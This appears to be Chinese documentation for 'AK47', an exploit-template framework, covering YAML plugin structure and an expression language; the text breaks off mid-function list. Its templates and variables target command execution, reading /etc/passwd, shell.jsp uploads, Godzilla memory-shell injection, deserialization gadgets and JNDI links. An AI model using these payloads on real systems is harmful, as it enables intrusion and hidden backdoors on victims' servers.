# AK47 语法文档

## 目录

1. [文件格式](#文件格式)
2. [模板结构](#模板结构)
3. [基础语法](#基础语法)
4. [内置变量](#内置变量)
5. [内置函数](#内置函数)
6. [参考示例](#参考示例)
7. [常见错误](#常见错误)

## 文件格式

漏洞模板存放在 `plugin/` 目录, 命名格式为: `产品/漏洞名#类型.yml`

```
plugin/
├── Shiro/
│   ├── shiro-550-aes-cbc#C.yml
│   └── shiro-550-aes-cbc#M.yml
├── VMware/
│   ├── vmware-vcenter-lfi#D.yml
│   ├── vmware-vcenter-log4j#C.yml
│   ├── vmware-vcenter-log4j#M.yml
│   └── vmware-vcenter-uploadova#U.yml
└── ...
```

**类型说明:**

- U - 文件上传 Upload
- C - 命令执行 Command
- D - 文件下载 Download
- M - 内存马注入 MemShell

## 模板结构

### TCP

```yaml
# 插件名称
name: product-vuln-name

# 模板类型, 可选: ws | tcp | udp | http (默认) | websocket
type: tcp

# 关联标签, 用于搜索筛选
tags:
    - Tag1
    - Tag2

# 全局变量, 仅限 rules 中使用
vars:
    # 变量名: 表达式
    Magic: hexdec(exploit.option.arg1)
    Param: Magic + exploit.download

# 默认参数, 仅允许下述参数
default:
    # 自定义参数 (exploit.option)
    arg1: "05060708"
    arg2: "..."
    arg3: "..."
    # 以下类型有一项即可
    # 命令执行 (exploit.command)
    method: tomcat,spring   # (可选) 一般设置 OOB 或回显马
    command: whoami
    # 文件下载 (exploit.download)
    download: /etc/passwd
    # 文件上传 (exploit.upload)
    remote: shell.jsp
    # MemShell (exploit.memshell)
    tool: Godzilla          # 限制内存马工具
    server: Tomcat,WebLogic # 限制内存马服务类型
    method: Filter,Listener # 限制内存马挂载方式
    custom: "*.class"       # 限制自定义内存马文件后缀

# 规则集合
rules:
    r0:
        request:
            body: "-"   # 当 body 为 "-" 时将直接读取响应
        # 规则匹配表达式
        expr: response.body.HasPrefix(Magic)
    r1:
        # 请求模板, 只允许 {{}} 填充变量而非表达式
        request:
            body: "{{Param}}"
        # 规则匹配表达式
        expr: response.body.HasPrefix(Magic)
        # 当规则匹配时, 输出表达式结果
        print:
            - string(response.body)[len(Magic):]

# 通过表达式编排规则流程, 结果要求布尔值
expr: r0() && r1()
```

### HTTP

```yaml
# 插件名称
name: product-vuln-name

# 模板类型, 可选: ws | tcp | udp | http (默认) | websocket
type: http

# 关联标签, 用于搜索筛选
tags:
    - Tag1
    - Tag2

# 全局变量, 仅限 rules 中使用
vars:
    # 变量名: 表达式
    UUID: uuid()
    User: exploit.option.arg1
    Pass: exploit.option.arg2
    Command: format(`%s && echo %s`, exploit.command, UUID)

# 默认参数, 仅允许下述参数
default:
    # 自定义参数 (exploit.option)
    arg1: "admin"
    arg2: "123456"
    arg3: ""
    # 以下类型有一项即可
    # 命令执行 (exploit.command)
    method: tomcat,spring   # (可选) 一般设置 OOB 或回显马
    command: whoami
    # 文件下载 (exploit.download)
    download: /etc/passwd
    # 文件上传 (exploit.upload)
    remote: shell.jsp
    # MemShell (exploit.memshell)
    tool: Godzilla          # 限制内存马工具
    server: Tomcat,WebLogic # 限制内存马服务类型
    method: Filter,Listener # 限制内存马挂载方式
    custom: "*.class"       # 限制自定义内存马文件后缀

# 规则集合
rules:
    r0:
        # 请求模板, 只允许 {{}} 填充变量而非表达式
        request:
            method: POST
            path: /login
            redirect: true
            body: "user={{User}}&pass={{Pass}}"
        # 规则匹配表达式
        expr: response.status == 200 && response.body.Has("token")
        # 当规则匹配时, 提取内容设置变量, 供后续规则使用
        vars:
            # 变量名: 表达式
            Token: response.body.Submatch(`"token":"(.+?)"`)
    r1:
        # 请求模板, 只允许 {{}} 填充变量而非表达式
        request:
            method: POST
            path: /exec
            headers:
                Token: "{{Token}}"
                Content-Type: application/x-www-form-urlencoded
            body: "cmd={{Command}}"
        # 规则匹配表达式
        expr: response.status == 200 && response.body.Has(UUID)
        # 当规则匹配时, 输出表达式结果
        print:
            - 'format("Token: %s", Token)'
            - response.body.Truncate(UUID)

# 通过表达式编排规则流程, 结果要求布尔值
expr: r0() && r1()
```

### WebSocket

```yaml
# 插件名称
name: product-vuln-name

# 模板类型, 可选: ws | tcp | udp | http (默认) | websocket
type: websocket

# 关联标签, 用于搜索筛选
tags:
    - Tag1
    - Tag2

# 全局变量, 仅限 rules 中使用
vars:
    # 变量名: 表达式
    Path: '"/v1/ws"'    # WebSocket 请求路径, 需要额外包裹一层来保证字符串, 避免报错: unexpected token Operator("/")
    Shell: base64(exploit.upload.content)

# 默认参数, 仅允许下述参数
default:
    # 自定义参数 (exploit.option)
    arg1: "..."
    arg2: "..."
    arg3: "..."
    # 以下类型有一项即可
    # 命令执行 (exploit.command)
    method: tomcat,spring   # (可选) 一般设置 OOB 或回显马
    command: whoami
    # 文件下载 (exploit.download)
    download: /etc/passwd
    # 文件上传 (exploit.upload)
    remote: shell.jsp
    # MemShell (exploit.memshell)
    tool: Godzilla          # 限制内存马工具
    server: Tomcat,WebLogic # 限制内存马服务类型
    method: Filter,Listener # 限制内存马挂载方式
    custom: "*.class"       # 限制自定义内存马文件后缀

# 规则集合
rules:
    r0:
        request:
            body: "-"   # 当 body 为 "-" 时将直接读取响应
        # 规则匹配表达式
        expr: response.body.Has("token")
        # 当规则匹配时, 提取内容设置变量, 供后续规则使用
        vars:
            # 变量名: 表达式
            Token: response.body.Submatch(`"token":"(.+?)"`)
    r1:
        # 请求模板, 只允许 {{}} 填充变量而非表达式
        request:
            method: Text    # 支持 Text, Ping, Pong, Close, Binary
            body: |
                {"file":"{{Shell}}","token":"{{Token}}"}
        # 规则匹配表达式
        expr: response.body.Has("success")
        # 当规则匹配时, 输出表达式结果
        print:
            - 'format("Token: %s", Token)'
            - response.body.Submatch(`"path":"(.+?)"`)

# 通过表达式编排规则流程, 结果要求布尔值
expr: r0() && r1()
```

## 基础语法

### 字面量

| 类型       | 示例                             |
| ---------- | -------------------------------- |
| **注释**   | `/* */` 或 `//`                  |
| **布尔值** | `true`, `false`                  |
| **整数**   | `42`, `0x2A`, `0o52`, `0b101010` |
| **浮点数** | `0.5`, `.5`                      |
| **字符串** | `"foo"`, `'bar'`, `` `多行` ``   |
| **数组**   | `[1, 2, 3]`                      |
| **对象**   | `{a: 1, b: 2}`                   |
| **空值**   | `nil`                            |

### 运算符

| 类型       | 运算符                                      |
| ---------- | ------------------------------------------- |
| **算术**   | `+`, `-`, `*`, `/`, `%`, `^` 或 `**`        |
| **比较**   | `==`, `!=`, `<`, `>`, `<=`, `>=`            |
| **逻辑**   | `!` 或 `not`, `&&` 或 `and`, `\|\|` 或 `or` |
| **条件**   | `? :`, `??`, `if {} else {}`                |
| **成员**   | `.`, `[]`, `?.`, `in`                       |
| **字符串** | `+`, `contains`, `startsWith`, `endsWith`   |
| **正则**   | `matches`                                   |
| **范围**   | `..`                                        |
| **切片**   | `[:]`                                       |
| **管道**   | `\|`                                        |

### 变量

```expr
let x = 42; x * 2

let x = 42; 
let y = 2; 
x * y

let name = user.Name | lower() | split(" "); 
"Hello, " + name[0] + "!"
```

### 成员

```expr
user.Name == user["Name"]

author.User?.Name 或 author.User != nil ? author.User.Name : nil

author.User?.Name ?? "Anonymous" 或 author.User != nil ? author.User.Name : "Anonymous"
```

### 切片

```expr
array[1:4] == [2, 3, 4]
array[1:-1] == [2, 3, 4]
array[:3] == [1, 2, 3]
array[3:] == [4, 5]
array[:] == array
```

### 管道

```expr
user.Name | lower() | split(" ") == split(lower(user.Name), " ")
```

### 范围

```expr
1..3 == [1, 2, 3]
```

### 谓词

谓词是一种表达式, 可以用于 filter, all, any, one, none 等函数

```expr
filter(0..9, {# % 2 == 0}) == [0, 2, 4, 6, 8]
filter(tweets, {len(.Content) > 240}) 或 filter(tweets, len(.Content) > 240)
```

## 内置变量

### config

| 属性             | 说明       | 示例                             |
| ---------------- | ---------- | -------------------------------- |
| `config.mode`    | 代理模式   | `"auto"`,`"direct"`,`"global"`   |
| `config.proxy`   | 代理地址   | `"socks5://127.0.0.1:1080"`      |
| `config.buffer`  | 缓冲区大小 | `1048576`                        |
| `config.timeout` | 超时时间   | `10`                             |
| `config.headers` | 全局请求头 | `["X-Forwarded-For: 127.0.0.1"]` |

### exploit

**option** - 自定义参数

| 属性                  | 说明        |
| --------------------- | ----------- |
| `exploit.option.arg1` | 自定义参数1 |
| `exploit.option.arg2` | 自定义参数2 |
| `exploit.option.arg3` | 自定义参数3 |

**download** - 文件下载

| 属性               | 说明     | 示例            |
| ------------------ | -------- | --------------- |
| `exploit.download` | 下载路径 | `"/etc/passwd"` |

**upload** - 文件上传

| 属性                     | 说明     | 示例                        |
| ------------------------ | -------- | --------------------------- |
| `exploit.upload.local`   | 本地路径 | `"/User/Desktop/shell.txt"` |
| `exploit.upload.remote`  | 远程路径 | `"/var/www/html/shell.jsp"` |
| `exploit.upload.content` | 文件内容 | `"<%@ page ...%>"`          |

**command** - 命令执行

| 属性                      | 说明           | 示例                                 |
| ------------------------- | -------------- | ------------------------------------ |
| `exploit.command.type`    | 执行类型       | `"Command"`,`"ByteCode"`             |
| `exploit.command.class`   | 回显马类名     | `"com.example.Main"`                 |
| `exploit.command.format`  | 回显马格式     | `"BCEL"`, `"Class"`, `"Base64"`, ... |
| `exploit.command.header`  | 回显马请求头   | `"X-Access-Token"`                   |
| `exploit.command.bypass`  | 绕过模块限制   | `false`                              |
| `exploit.command.method`  | OOB/回显马方式 | `"curl"`, `"tomcat"`                 |
| `exploit.command.command` | 执行指定命令   | `"whoami"`                           |

`exploit.command.method` 支持如下:

- 回显马: `bes`, `resin`, `jboss`, `jetty`, `apusic`, `tomcat`, `tongweb`, `weblogic`, `undertow`, `spring`, `glassfish`, `websphere`, `inforsuite`
- OOB 回显: `curl`, `ping`, `nslookup`

| 方法                                   | 说明              | 示例                                                                                                       |
| -------------------------------------- | ----------------- | ---------------------------------------------------------------------------------------------------------- |
| `exploit.command.Set(key, value, ...)` | 设置命令属性      | `exploit.command.Set("bypass", true, "header", "X-API-Key")`                                                   |
| `exploit.command.OOB(os?)`             | 带外回显命令      | `exploit.command.OOB("windows")`                                                                           |
| `exploit.command.Msp(format)`          | 命令回显载荷      | `exploit.command.Msp("SpEL")`                                                                              |
| `exploit.command.Yso(gadget)`          | Java 反序列化载荷 | `exploit.command.Yso("CommonsBeanutils1")`                                                                 |
| `exploit.command.JNDI(scheme, gadget)` | JNDI 注入链接     | `exploit.command.JNDI("ldap", "CommonsBeanutils1")`                                                        |
| `exploit.command.Chains(cli)`          | Java-Chains 载荷  | `exploit.command.Chains("-p JavaNativePayload -s /CommonsBeanutils1/TemplatesImpl2/BytecodeFromBase64/x")` |

`exploit.command.Msp` 支持 `format` 如下:

`AbstractTranslet`, `Aviator`, `Base64`, `Base64URLEncoded`, `BCEL`, `BeanShell`, `BigInteger`, `Class`, `ClassLoaderJSP`, `ClassLoaderJSPUnicode`, `DefaultBase64`, `DefaultScriptEngine`, `DefineClassJSP`, `DefineClassJSPUnicode`, `EL`, `Freemarker`, `Groovy`, `GroovyClassDefiner`, `GroovyScriptEngine`, `GzipBase64`, `H2`, `H2Javac`, `H2JS`, `H2JSURLEncode`, `Hessian2Deserialize`, `Hessian2XSLTScriptEngine`, `HessianDeserialize`, `HessianXSLTScriptEngine`, `JavaCommonsBeanutils110`, `JavaCommonsBeanutils16`, `JavaCommonsBeanutils17`, `JavaCommonsBeanutils18`, `JavaCommonsBeanutils19`, `JavaCommonsCollections3`, `JavaCommonsCollections4`, `JavaDeserialize`, `JDKAbstractTransletPacker`, `JEXL`, `JinJava`, `JSP`, `JSPX`, `JSPXUnicode`, `JXPath`, `JXPathScriptEngine`, `JXPathSpringGzip`, `JXPathSpringGzipJDK17`, `MVEL`, `OGNL`, `OGNLScriptEngine`, `OGNLSpringGzip`, `OGNLSpringGzipJDK17`, `OracleAbstractTransletPacker`, `Rhino`, `ScriptEngine`, `ScriptEngineBigInteger`, `ScriptEngineNoSquareBrackets`, `SpEL`, `SpELScriptEngine`, `SpELSpringGzip`, `SpELSpringGzipJDK17`, `Velocity`, `XalanAbstractTransletPacker`, `XMLDecoder`, `XMLDecoderDefineClass`, `XMLDecoderScriptEngine`

特别说明: `exploit.command.Msp`, `exploit.command.Yso`, `exploit.command.JNDI`, `exploit.command.Chains` 需要搭配请求头 `X-Access-Token`, 该请求头可通过 `exploit.command.Set("header", "X-API-Key")` 进行设置

**memshell** - 内存马注入

| 属性                      | 说明         | 示例                                 |
| ------------------------- | ------------ | ------------------------------------ |
| `exploit.memshell.tool`   | 内存马工具   | `"Godzilla"`                         |
| `exploit.memshell.server` | 服务类型     | `"Tomcat"`                           |
| `exploit.memshell.method` | 挂载方式     | `"Filter"`                           |
| `exploit.memshell.path`   | 连接路径     | `"/assets/favicon.ico"`              |
| `exploit.memshell.key`    | 连接密钥     | `"key"`                              |
| `exploit.memshell.pass`   | 连接密码     | `"pass"`                             |
| `exploit.memshell.header` | 请求头       | `"Referer"`                          |
| `exploit.memshell.value`  | 请求头值     | `"/v1/user/x"`                       |
| `exploit.memshell.class`  | 注入器类名   | `"com.example.Main"`                 |
| `exploit.memshell.format` | 内存马格式   | `"BCEL"`, `"Class"`, `"Base64"`, ... |
| `exploit.memshell.bypass` | 绕过模块限制 | `false`                              |
| `exploit.memshell.custom` | 自定义内存马 | `"/User/Desktop/shell.class"`        |

| 方法                                    | 说明              | 示例                                                                                                        |
| --------------------------------------- | ----------------- | ----------------------------------------------------------------------------------------------------------- |
| `exploit.memshell.Set(key, value, ...)` | 设置内存马属性    | `exploit.memshell.Set("bypass", true)`                                                                      |
| `exploit.memshell.Msp(format)`          | 内存马载荷        | `exploit.memshell.Msp("Freemarker")`                                                                        |
| `exploit.memshell.Yso(gadget)`          | Java 反序列化载荷 | `exploit.memshell.Yso("CommonsBeanutils1")`                                                                 |
| `exploit.memshell.JNDI(scheme, gadget)` | JNDI 注入链接     | `exploit.memshell.JNDI("ldap", "CommonsBeanutils1")`                                                        |
| `exploit.memshell.Print(data?)`         | 输出注入结果      | `exploit.memshell.Print(response.body)`                                                                     |
| `exploit.memshell.Chains(cli)`          | Java-Chains 载荷  | `exploit.memshell.Chains("-p JavaNativePayload -s /CommonsBeanutils1/TemplatesImpl2/BytecodeFromBase64/x")` |

`exploit.memshell.Msp` 支持 `format` 如下:

`AbstractTranslet`, `AgentJar`, `AgentJarWithJDKAttacher`, `AgentJarWithJREAttacher`, `Aviator`, `Base64`, `Base64URLEncoded`, `BCEL`, `BeanShell`, `BigInteger`, `Class`, `ClassLoaderJSP`, `ClassLoaderJSPUnicode`, `DefaultBase64`, `DefaultScriptEngine`, `DefineClassJSP`, `DefineClassJSPUnicode`, `EL`, `Freemarker`, `Groovy`, `GroovyClassDefiner`, `GroovyScriptEngine`, `GroovyTransformJar`, `GzipBase64`, `H2`, `H2Javac`, `H2JS`, `H2JSURLEncode`, `Hessian2Deserialize`, `Hessian2XSLTScriptEngine`, `HessianDeserialize`, `HessianXSLTScriptEngine`, `Jar`, `JavaCommonsBeanutils110`, `JavaCommonsBeanutils16`, `JavaCommonsBeanutils17`, `JavaCommonsBeanutils18`, `JavaCommonsBeanutils19`, `JavaCommonsCollections3`, `JavaCommonsCollections4`, `JavaDeserialize`, `JDKAbstractTransletPacker`, `JEXL`, `JinJava`, `JSP`, `JSPX`, `JSPXUnicode`, `JXPath`, `JXPathScriptEngine`, `JXPathSpringGzip`, `JXPathSpringGzipJDK17`, `MVEL`, `OGNL`, `OGNLScriptEngine`, `OGNLSpringGzip`, `OGNLSpringGzipJDK17`, `OracleAbstractTransletPacker`, `Rhino`, `ScriptEngine`, `ScriptEngineBigInteger`, `ScriptEngineJar`, `ScriptEngineNoSquareBrackets`, `SpEL`, `SpELScriptEngine`, `SpELSpringGzip`, `SpELSpringGzipJDK17`, `Velocity`, `XalanAbstractTransletPacker`, `XMLDecoder`, `XMLDecoderDefineClass`, `XMLDecoderScriptEngine`, `XxlJob`

### request

| 属性                   | 说明       | 示例                                         |
| ---------------------- | ---------- | -------------------------------------------- |
| `request.url.scheme`   | 协议       | `"ws"`, `"tcp"`, `"http"`, ...               |
| `request.url.host`     | 主机+端口  | `"example.com:8080"`                         |
| `request.url.domain`   | IP / 域名  | `"127.0.0.1"`, `"example.com"`               |
| `request.url.port`     | 端口号     | `"8080"`                                     |
| `request.url.path`     | 资源路径   | `"/api/v1"`                                  |
| `request.url.query`    | 查询参数   | `"id=1"`                                     |
| `request.url.fragment` | 片段/锚点  | `"section"`                                  |
| `request.method`       | 请求方式   | `"GET"`, `"POST"`                            |
| `request.path`         | 请求路径   | `"/api/v1"`                                  |
| `request.body`         | 请求内容   | `"username=admin&password=123456"`           |
| `request.headers`      | 请求头     | `{"Authorization":"Basic YWRtaW46MTIzNDU2"}` |
| `request.redirect`     | 跟随重定向 | `true`                                       |

| 方法                    | 说明   | 示例                        |
| ----------------------- | ------ | --------------------------- |
| `request.url.BaseURL()` | 根地址 | `"http://example.com:8080"` |

### response

| 属性                    | 说明         | 示例                               |
| ----------------------- | ------------ | ---------------------------------- |
| `response.status`       | 状态码       | `200`, `404`, `500`, ...           |
| `response.cookie`       | Cookie值     | `"uid=001; sess=202cb962ac59075b"` |
| `response.header`       | 响应头 (str) | `"Content-Type: text/html\r\n"`    |
| `response.headers`      | 响应头 (map) | `{"content-type":"text/html"}`     |
| `response.body`         | 响应内容     | `"<html>..."`                      |
| `response.title`        | 页面标题     | `"Welcome"`                        |
| `response.raw_body`     | 原始响应     | `"<html>..."`                      |
| `response.content_type` | 内容类型     | `"text/html"`                      |

### advanced

在 `request` 和 `response` 中, 除了 `request.redirect` 和 `response.status` 均支持以下方法:

| 方法                     | 说明             | 示例                                    |
| ------------------------ | ---------------- | --------------------------------------- |
| `*.Has(sub)`             | 包含子串         | `response.body.Has("success")`          |
| `*.HasPrefix(prefix)`    | 以前缀开头       | `response.body.HasPrefix("{")`          |
| `*.HasSuffix(suffix)`    | 以后缀结尾       | `response.body.HasSuffix("}")`          |
| `*.Match(regex)`         | 匹配正则         | `response.body.Match("\\d+")`           |
| `*.Submatch(regex)`      | 提取第一个捕获组 | `response.body.Submatch("token=(.+?)")` |
| `*.Truncate(sub)`        | 截取子串之前内容 | `response.body.Truncate("<!DOCTYPE")`   |
| `*.ReplaceAll(old, new)` | 替换所有匹配子串 | `response.body.ReplaceAll("\\n", "\n")` |

## 内置函数

### 字符串

#### format(format, arg1[, ...])

根据指定格式和参数输出字符串

```expr
format("Hello %s %d", "World", 2026) == "Hello World 2026"
```

#### strrev(str)

将字符串 `str` 反转

```expr
strrev("hello") == "olleh"
```

#### unicode(str)

将字符串 `str` 转换为 Unicode 转义序列

```expr
unicode("hi") == "\u0068\u0069"
```

#### trim(str[, chars])

移除字符串 `str` 两端的空白字符如果提供了可选参数 `chars`, 则移除其中指定的字符

```expr
trim("  Hello  ") == "Hello"
trim("__Hello__", "_") == "Hello"
```

#### trimPrefix(str, prefix)

如果字符串 `str` 以指定的 `prefix` 开头, 则移除该前缀

```expr
trimPrefix("HelloWorld", "Hello") == "World"
```

#### trimSuffix(str, suffix)

如果字符串 `str` 以指定的 `suffix` 结尾, 则移除该后缀

```expr
trimSuffix("HelloWorld", "World") == "Hello"
```

#### upper(str)

将字符串 `str` 中的所有字符转换为大写

```expr
upper("hello") == "HELLO"
```

#### lower(str)

将字符串 `str` 中的所有字符转换为小写

```expr
lower("HELLO") == "hello"
```

#### split(str, delimiter[, n])

根据指定分隔符 `delimiter` 拆分字符串 `str`

```expr
split("apple,orange,grape", ",") == ["apple", "orange", "grape"]
split("apple,orange,grape", ",", 2) == ["apple", "orange,grape"]
```

#### splitAfter(str, delimiter[, n])

根据指定分隔符 `delimiter` 拆分字符串 `str`, 拆分结果中保留分隔符

```expr
splitAfter("apple,orange,grape", ",") == ["apple,", "orange,", "grape"]
splitAfter("apple,orange,grape", ",", 2) == ["apple,", "orange,grape"]
```

#### replace(str, old, new)

将字符串 `str` 中所有的 `old` 替换为 `new`

```expr
replace("Hello World", "World", "Universe") == "Hello Universe"
```

#### repeat(str, n)

将字符串 `str` 重复 `n` 次

```expr
repeat("Hi", 3) == "HiHiHi"
```

#### indexOf(str, substring)

返回子字符串 `substring` 在字符串 `str` 中第一次出现的索引, 如果未找到则返回 -1

```expr
indexOf("apple pie", "pie") == 6
```

#### lastIndexOf(str, substring)

返回子字符串 `substring` 在字符串 `str` 中最后一次出现的索引, 如果未找到则返回 -1

```expr
lastIndexOf("apple pie apple", "apple") == 10
```

#### hasPrefix(str, prefix)

如果字符串 `str` 以给定的前缀 `prefix` 开头, 则返回 `true`

```expr
hasPrefix("HelloWorld", "Hello") == true
```

#### hasSuffix(str, suffix)

如果字符串 `str` 以给定的后缀 `suffix` 结尾, 则返回 `true`

```expr
hasSuffix("HelloWorld", "World") == true
```

### 加解密

#### md5(v)

计算数据的 MD5 哈希值, 返回小写的十六进制字符串

```expr
md5("hello") == "5d41402abc4b2a76b9719d911017c592"
```

#### sha(alg, v)

使用指定的哈希算法(sha1, sha224, sha256, sha384, sha512)计算数据的 SHA 哈希值, 返回小写的十六进制字符串

```expr
sha("sha256", "hello") == "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
```

#### sm3(v)

计算数据的 SM3 哈希值, 返回小写的十六进制字符串

```expr
sm3("hello") == "becbbfaae6548b8bf0cfcad5a27183cd1be6093b1cceccc303d9c61d0a645268"
```

#### xor(key, v)

对数据进行异或运算

```expr
xor("key", "hello") == "\x00\x04\x1d\x0a"
```

#### jwt(alg, key, v)

根据指定的算法、密钥和数据生成 JWT 字符串

```expr
jwt("HS256", "secret", `{"sub": "1234567890", "name": "John", "iat": 1516239022}`) == "eyJhbGciOiJIUzI1NiIsInR5cCI..."
```

#### hmac(alg, key, v)

使用指定的哈希算法(md5, sha1, sha224, sha256, sha384, sha512)和密钥计算数据的 HMAC 哈希值, 返回十六进制字符串

```expr
hmac("sha256", "123456", "hello") == "ac28d602c767424d0c809edebf73828bed5ce99ce1556f4df8e223faeec60edd"
```

#### aes(mode, key, iv, v) / toAES(mode, key, iv, v)

使用 AES 算法加密数据, 支持`ECB`, `CBC`, `CFB`, `CTR`, `OFB`, `GCM`

```expr
aes("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
toAES("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
```

#### des(mode, key, iv, v) / toDES(mode, key, iv, v)

使用 DES 算法加密数据, 支持`ECB`, `CBC`, `CFB`, `CTR`, `OFB`

```expr
des("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
toDES("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
```

#### sm4(mode, key, iv, v) / toSM4(mode, key, iv, v)

使用 SM4 算法加密数据, 支持`ECB`, `CBC`, `CFB`, `CTR`, `OFB`, `GCM`

```expr
sm4("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
toSM4("CBC", "1234567812345678", "1234567812345678", "hello") == "\x1d\x18\x16\x14\x12..."
```

#### rsa(key, v) / toRSA(key, v)

使用 RSA 公钥或私钥加密数据

```expr
rsa("-----BEGIN PUBLIC KEY-----...", "hello 123") == "\x10\xb2\x91\x8c..."
toRSA("-----BEGIN PRIVATE KEY-----...", "hello 321") == "\x80\xf4\xc2\xa6..."
```

#### sm2(key, v, mode?) / toSM2(key, v, mode?)

使用 SM2 公钥或私钥加密数据

支持 `mode` 如下:

- C1C3C2
- C1C2C3

```expr
sm2("-----BEGIN PUBLIC KEY-----...", "hello 123", "C1C3C2") == "\x10\xb2\x91\x8c..."
toSM2("-----BEGIN PRIVATE KEY-----...", "hello 321", "C1C3C2") == "\x80\xf4\xc2\xa6..."
```

#### fromAES(mode, key, iv, v)

使用 AES 算法解密数据, 支持`ECB`, `CBC`, `CFB`, `CTR`, `OFB`, `GCM`

```expr
fromAES("CBC", "1234567812345678", "1234567812345678", "\x1d\x18\x16\x14\x12...") == "hello"
```

#### fromDES(mode, key, iv, v)

使用 DES 算法解密数据, 支持`ECB`, `CBC`, `CFB`, `CTR`, `OFB`

```expr
fromDES("CBC", "1234567812345678", "1234567812345678", "\x1d\x18\x16\x14\x12...") == "hello"
```

#### fromSM4(mode, key, iv, v)

使用 SM4 算法解密数据, 支持`ECB`, `CBC`, `CFB`, `CTR`, `OFB`, `GCM`

```expr
fromSM4("CBC", "1234567812345678", "1234567812345678", "\x1d\x18\x16\x14\x12...") == "hello"
```

#### fromRSA(key, v)

使用 RSA 公钥或私钥解密数据

```expr
fromRSA("-----BEGIN PUBLIC KEY-----...", "\x80\xf4\xc2\xa6...") == "hello 321"
fromRSA("-----BEGIN PRIVATE KEY-----...", "\x10\xb2\x91\x8c...") == "hello 123"
```

#### fromSM2(key, v, mode?)

使用 SM2 私钥解密数据

支持 `mode` 如下:

- C1C3C2
- C1C2C3

```expr
fromSM2("-----BEGIN PRIVATE KEY-----...", "\x10\xb2\x91\x8c...", "C1C3C2") == "hello 123"
```

### 编解码

#### bcel(v)

将 Java 字节码编码为 BCEL 格式

```expr
bcel("\xca\xfe\xba\xbe...") == "$$BCEL$$..."
```

#### hex(v) / toHex(v)

将数据编码为十六进制字符串

```expr
hex("hello") == "68656c6c6f"
toHex("hello") == "68656c6c6f"
```

#### hexdec(v) / fromHex(v)

解码十六进制字符串

```expr
hexdec("68656c6c6f") == "hello"
fromHex("68656c6c6f") == "hello"
```

#### base64(v) / toBase64(v)

将数据编码为 Base64 字符串

```expr
base64("Hello World") == "SGVsbG8gV29ybGQ="
toBase64("Hello World") == "SGVsbG8gV29ybGQ="
```

#### b64dec(v) / fromBase64(v)

解码 Base64 字符串

```expr
b64dec("SGVsbG8gV29ybGQ=") == "Hello World"
fromBase64("SGVsbG8gV29ybGQ=") == "Hello World"
```

#### urlencode(v)

将数据进行 URL 编码

```expr
urlencode("hello world") == "hello+world"
```

#### urldecode(v)

解码 URL 编码的数据

```expr
urldecode("hello+world") == "hello world"
```

### 数学计算

#### len(v)

返回数组、字符串或对象的长度

```expr
len([1, 2, 3]) == 3
len({"name": "John", "age": 30}) == 2
len("Hello") == 5
```

#### max(n1, n2)

返回两个数字中的较大值

```expr
max(5, 7) == 7
```

#### min(n1, n2)

返回两个数字中的较小值

```expr
min(5, 7) == 5
```

#### abs(n)

返回数字的绝对值

```expr
abs(-5) == 5
```

#### ceil(n)

向上取整

```expr
ceil(1.5) == 2.0
```

#### floor(n)

向下取整

```expr
floor(1.5) == 1.0
```

#### round(n)

四舍五入取整

```expr
round(1.5) == 2.0
```

### 数组方法

#### all(array, predicate)

如果数组中所有元素都满足谓词条件, 则返回 `true`

```expr
all([2, 4, 6], {# % 2 == 0}) == true
```

#### any(array, predicate)

如果数组中存在满足谓词条件的元素, 则返回 `true`

```expr
any([1, 2, 3], {# > 2}) == true
```

#### one(array, predicate)

如果数组中仅有一个元素满足谓词条件, 则返回 `true`

```expr
one([1, 2, 3], {# == 1}) == true
```

#### none(array, predicate)

如果数组中所有元素都不满足谓词条件, 则返回 `true`

```expr
none([1, 2, 3], {# > 5}) == true
```

#### map(array, predicate)

将谓词应用于数组中的每个元素, 并返回新数组

```expr
map([1, 2, 3], {# * 2}) == [2, 4, 6]
```

#### filter(array, predicate)

根据谓词条件过滤数组元素, 并返回新数组

```expr
filter([1, 2, 3, 4], {# > 2}) == [3, 4]
```

#### find(array, predicate)

查找数组中满足谓词条件的第一个元素

```expr
find([1, 2, 3, 4], {# > 2}) == 3
```

#### findIndex(array, predicate)

查找数组中满足谓词条件的第一个元素的索引

```expr
findIndex([1, 2, 3, 4], {# > 2}) == 2
```

#### findLast(array, predicate)

查找数组中满足谓词条件的最后一个元素

```expr
findLast([1, 2, 3, 4], {# > 2}) == 4
```

#### findLastIndex(array, predicate)

查找数组中满足谓词条件的最后一个元素的索引

```expr
findLastIndex([1, 2, 3, 4], {# > 2}) == 3
```

#### groupBy(array, predicate)

根据谓词的结果对数组元素进行分组

```expr
groupBy(users, .Age) == {20: [...], 30: [...]}
```

#### count(array[, predicate])

返回满足谓词条件的元素数量

```expr
count([1, 2, 3, 4], {# > 2}) == 2
```

#### concat(array1, array2[, ...])

连接两个或多个数组

```expr
concat([1, 2], [3, 4]) == [1, 2, 3, 4]
```

#### flatten(array)

将给定数组展平为一维数组

```expr
flatten([1, 2, [3, 4]]) == [1, 2, 3, 4]
```

#### uniq(array)

从数组中删除重复项

```expr
uniq([1, 2, 3, 2, 1]) == [1, 2, 3]
```

#### join(array[, delimiter])

使用分隔符将数组连接成字符串

```expr
join(["apple", "orange", "grape"]) == "appleorangegrape"
join(["apple", "orange", "grape"], ",") == "apple,orange,grape"
```

#### reduce(array, predicate[, initialValue])

将谓词应用于数组中的每个元素, 从而将数组简化为单个值. 可通过 `initialValue` 指定累加器的初始值, 未提供 `initialValue` 则使用数组的第一个元素作为初始值

谓词中可使用的变量如下:

- `#` - 当前元素
- `#acc` - 累加器
- `#index` - 当前元素的索引

```expr
reduce(1..9, #acc * #) == 362880
reduce(1..9, #acc * #, 0) == 0
```

#### sum(array[, predicate])

返回数组中所有数字的总和

```expr
sum([1, 2, 3]) == 6
```

#### mean(array)

返回数组中所有数字的平均值

```expr
mean([3, 6, 18]) == 9.0
```

#### median(array)

返回数组中所有数字的中位数

```expr
median([2, 5, 7]) == 5
```

#### first(array)

返回数组的第一个元素

```expr
first([1, 2, 3]) == 1
```

#### last(array)

返回数组的最后一个元素

```expr
last([1, 2, 3]) == 3
```

#### take(array, n)

返回数组的前 `n` 个元素

```expr
take([1, 2, 3, 4], 2) == [1, 2]
```

#### reverse(array)

返回数组的反转副本

```expr
